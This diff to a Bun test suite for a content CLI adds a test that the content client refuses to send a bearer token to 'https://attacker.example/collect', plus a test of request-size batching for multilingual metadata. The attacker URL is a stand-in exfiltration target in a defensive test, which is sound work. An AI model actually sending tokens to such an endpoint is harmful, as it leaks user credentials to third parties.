@@ -1,5 +1,6 @@
 import { expect, test } from "bun:test";
-import { runContentCLI } from "../../scripts/content";
+import { runContentCLI, splitCandidates } from "../../scripts/content";
+import type { ContentMetadata } from "../../src/content/contracts";
 import { createContentClient } from "../../scripts/content-client";
 
 test("delete without --yes never reaches the content API", async () => {
@@ -56,6 +57,21 @@ test("content client rejects remote HTTP origins before transport", () => {
   expect(fetchCalled).toBe(false);
 });
 
+test("content client never sends a bearer token to an absolute external URL", async () => {
+  let requestURL: RequestInfo | URL | undefined;
+  const client = createContentClient({
+    baseURL: "http://127.0.0.1:5173",
+    token: "R".repeat(43),
+    fetcher: async (input) => {
+      requestURL = input;
+      return Response.json({});
+    },
+  });
+
+  await expect(client.request("https://attacker.example/collect")).rejects.toThrow();
+  expect(requestURL).toBeUndefined();
+});
+
 test("offline content check validates and counts the local Markdown manifest", async () => {
   const output: string[] = [];
   const code = await runContentCLI(
@@ -66,4 +82,28 @@ test("offline content check validates and counts the local Markdown manifest", a
 
   expect(code).toBe(0);
   expect(JSON.parse(output.join(""))).toEqual({ ok: true, candidateCount: 3 });
+});
+
+test("content preflight batches keep large multilingual metadata under the request cap", () => {
+  const entries: ContentMetadata[] = Array.from({ length: 101 }, (_, index) => ({
+    translationKey: `key-${index}`.padEnd(160, "k"),
+    locale: "zh-CN",
+    slug: `post-${index}`.padEnd(160, "x"),
+    kind: "article",
+    title: "你".repeat(200),
+    description: "你".repeat(500),
+    status: "published",
+    publishedAt: "2026-10-19T00:00:00.000Z",
+    startsAt: null,
+    endsAt: null,
+    location: "你".repeat(200),
+  }));
+  const batches = splitCandidates(entries);
+
+  expect(batches.map((batch) => batch.length)).toEqual([100, 1]);
+  for (const batch of batches) {
+    expect(new TextEncoder().encode(JSON.stringify({ entries: batch })).byteLength).toBeLessThan(
+      1_048_576,
+    );
+  }
 });
